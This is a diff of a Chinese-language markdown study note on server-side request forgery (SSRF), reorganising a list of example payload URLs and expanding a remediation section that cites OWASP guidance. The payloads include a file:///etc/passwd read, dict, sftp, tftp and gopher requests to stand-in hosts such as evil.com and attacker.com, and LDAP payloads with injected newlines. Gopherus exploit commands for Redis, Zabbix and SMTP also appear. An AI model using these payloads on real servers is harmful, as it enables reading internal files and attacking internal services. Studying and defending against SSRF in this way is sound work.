@@ -47,7 +47,23 @@ SSRFserver -> internalServer【2】SSRFserver为"跳板" 发出Requset2.        
 internalServer -> SSRFserver【3】SSRFserver得到req2的真实响应内容.
 SSRFserver -> attacker      【4】程序逻辑如果将req2的真实响应内容返回给攻击者则为Basic SSRF，否则为Blind SSRF.
 ```
- 
+
+
+* 第一个请求 通常是HTTP协议
+* 第二个请求 由应用程序本身功能决定 理论上可以有各种protocol/scheme
+  * `file://` `http://example.com/ssrf.php?url=file:///etc/passwd`
+  * `dict://` `http://example.com/ssrf.php?dict://evil.com:1337/`
+  * `sftp://` `http://example.com/ssrf.php?url=sftp://evil.com:1337/`
+  * `ldap://` 轻量级目录访问协议
+    * `http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit`
+    * `http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit`
+    * `http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit`
+  * `tftp://` TFTP（Trivial File Transfer Protocol,简单文件传输协议
+    * `http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET`
+  * `gopher://` Gopher是一种分布式文档传递服务
+    * `http://example.com/ssrf.php?url=http://attacker.com/gopher.php`
+
+
 ### 漏洞影响
 
 * 外网 - 对互联网发起请求(攻击其他网站等)
@@ -86,21 +102,6 @@ SSRFserver -> attacker      【4】程序逻辑如果将req2的真实响应内�
   * Redis (Port-6379)`gopherus --exploit redis`
   * Zabbix (Port-10050)`gopherus --exploit zabbix` 利用条件:Zabbix服务器开放了10050端口并配置了`EnableRemoteCommands = 1` 则可执行shell命令
   * SMTP (Port-25)`gopherus --exploit smtp`  利用开放的SMTP端口发送邮件
-
-### 测试方法
-
-* 尝试多种URL Schema
-  * `file://` `http://example.com/ssrf.php?url=file:///etc/passwd`
-  * `dict://` `http://example.com/ssrf.php?dict://evil.com:1337/`
-  * `sftp://` `http://example.com/ssrf.php?url=sftp://evil.com:1337/`
-  * `ldap://` 轻量级目录访问协议
-    * `http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit`
-    * `http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit`
-    * `http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit`
-  * `tftp://` TFTP（Trivial File Transfer Protocol,简单文件传输协议
-    * `http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET`
-  * `gopher://` Gopher是一种分布式文档传递服务
-    * `http://example.com/ssrf.php?url=http://attacker.com/gopher.php`
 
 ### gopher协议 - 利用原理
 
@@ -167,21 +168,23 @@ SSRF测试工具/利用工具
 
 ### 修复方式
 
+* 根据应用程序的功能和设计要求 发出请求通常2种情况
+  * 情况1:只向“指定”目标发送请求 - 用白名单方法
+  * 情况2:可向“任意”外部IP地址/域名发送请求
+    * 如果有非法字符 return false
+    * 禁用协议 - 仅允许必要的协议 如http和https
+    * 禁止重定向(Redirect)
+      * 301 redirect 永久性转移(Permanently Moved)
+      * 302 redirect 暂时性转移(Temporarily Moved)
+    * 严格限制参数值内容-"关键字白名单"
+    * 严格限制参数值长度
+    * ...
 
-* 如果有非法字符 return false
-* 禁用协议 - 仅允许必要的协议 如http和https
-* 禁止重定向(Redirect)
-  * 301 redirect 永久性转移(Permanently Moved)
-  * 302 redirect 暂时性转移(Temporarily Moved)
-* 严格限制参数值内容-"关键字白名单"
-* 严格限制参数值长度
-* ...
+参考 https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md
 
+-----
 
--------
-
-
-### 附-利用cURL支持的协议
+### cURL支持的协议
 
 cURL支持的协议很多
 ```
